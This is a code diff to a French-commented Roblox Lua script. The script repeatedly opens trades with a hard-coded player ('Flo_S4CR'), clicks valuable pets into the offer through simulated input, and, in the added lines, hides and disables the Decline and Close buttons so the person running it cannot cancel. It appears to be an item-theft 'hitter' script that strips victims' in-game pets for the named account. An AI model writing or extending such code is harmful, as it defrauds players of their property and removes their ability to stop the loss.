@@ -10,6 +10,11 @@ local TARGET_PLAYER_NAME = "Flo_S4CR"
 -- ⚠️ MODIFIE CE CHIFFRE SELON LE COOLDOWN DU JEU (10, 15 ou 30 secondes)
 local TEMPS_ENTRE_2_TRADES = 10 
 
+-- 🛡️ NOUVELLE OPTION : Cacher les boutons Decline et Close pendant le trade
+--   true  = les boutons sont désactivés dès que le trade s'ouvre (empêche tout clic)
+--   false = comportement normal, les boutons restent cliquables
+local HIDE_DECLINE_CLOSE = true
+
 local SEARCH_ORDER = {
     "The Ethereal Everia", "The Grand Titan", "Frozen Dragon", "Enchanted Pegasus",
     "Great Auk", "The Frozen Ancient", "Lava Monster", "Ghost Pirate",
@@ -33,6 +38,45 @@ local function fastClick(button)
     VirtualInputManager:SendMouseButtonEvent(posX, posY, 0, false, game, 1)
 end
 
+-- 🛡️ Cache les boutons Decline et Close dans l'interface de trade
+local function hideTradeButtons(TradeFrame)
+    if not HIDE_DECLINE_CLOSE or not TradeFrame then return end
+    
+    for _, btnName in ipairs({"Decline", "Close"}) do
+        local btn = TradeFrame:FindFirstChild(btnName, true)
+        if btn then
+            pcall(function()
+                btn.Visible = false
+                btn.Active = false
+                btn.Selectable = false
+                if btn:IsA("GuiButton") then
+                    btn.Interactable = false
+                end
+            end)
+            print("🛡️ Bouton '" .. btnName .. "' désactivé")
+        end
+    end
+end
+
+-- 🔓 Restaure les boutons (utile pour fermer un trade bloqué au cycle suivant)
+local function restoreTradeButtons(TradeFrame)
+    if not TradeFrame then return end
+    
+    for _, btnName in ipairs({"Decline", "Close"}) do
+        local btn = TradeFrame:FindFirstChild(btnName, true)
+        if btn then
+            pcall(function()
+                btn.Visible = true
+                btn.Active = true
+                btn.Selectable = true
+                if btn:IsA("GuiButton") then
+                    btn.Interactable = true
+                end
+            end)
+        end
+    end
+end
+
 -- =====================================================================
 -- 🔄 BOUCLE INFINIE
 -- =====================================================================
@@ -43,10 +87,17 @@ while true do
     local TradePlayerGui = PlayerGui:WaitForChild("TradePlayer")
     local TradingGui = PlayerGui:FindFirstChild("Trading")
     
-    -- On s'assure que l'interface de trade précédente est bien fermée
+    -- Ferme un éventuel trade précédent resté ouvert
     if TradingGui and TradingGui.Enabled then
+        -- On restaure d'abord les boutons (au cas où on les aurait cachés)
+        restoreTradeButtons(TradingGui.Container.Frame)
+        task.wait(0.1)
+        
         local closeTrade = TradingGui.Container.Frame:FindFirstChild("Close", true)
-        if closeTrade then fastClick(closeTrade) task.wait(0.5) end
+        if closeTrade then 
+            fastClick(closeTrade) 
+            task.wait(0.5) 
+        end
     end
 
     -- 1. Ouvrir le menu de sélection
@@ -58,7 +109,7 @@ while true do
         end
     end
 
-    -- 2. Chercher le bouton vert de Flo_hitss
+    -- 2. Chercher le bouton vert de la cible
     local scrollingFrame = TradePlayerGui.Container.General.Frame.Frame.ScrollingFrame
     local targetGreenButton = nil
 
@@ -100,6 +151,7 @@ while true do
             local tg = PlayerGui:FindFirstChild("Trading")
             if tg and tg.Enabled then
                 tradeOuvert = true
+                TradingGui = tg
                 break
             end
         end
@@ -108,8 +160,12 @@ while true do
             print("🎉 Trade ouvert ! Ajout des pets...")
             task.wait(1) 
 
-            -- 4. Ajouter les pets
             local TradeFrame = TradingGui.Container.Frame
+
+            -- 🛡️ NOUVELLE ÉTAPE : on cache Decline et Close dès l'ouverture du trade
+            hideTradeButtons(TradeFrame)
+
+            -- 4. Ajouter les pets
             local CurInventory = TradeFrame.CurInventory.ScrollingFrame
             local CurOffer = TradeFrame.CurOffer
             local SearchBar = TradeFrame.CurInventory.Search:FindFirstChildOfClass("TextBox")
@@ -195,11 +251,11 @@ while true do
                 end
             end
         else
-            warn("❌ Flo_hitss n'a pas accepté la demande (ou a refusé).")
+            warn("❌ " .. TARGET_PLAYER_NAME .. " n'a pas accepté la demande (ou a refusé).")
         end
     end
     
-    -- ⏱️ PAUSE AVANT LE PROCHAIN TRADE (Cooldown avec compte à rebours)
+    -- ⏱️ PAUSE AVANT LE PROCHAIN TRADE
     print("⏳ Cooldown du jeu : Attente de " .. TEMPS_ENTRE_2_TRADES .. " secondes...")
     for i = TEMPS_ENTRE_2_TRADES, 1, -1 do
         task.wait(1)
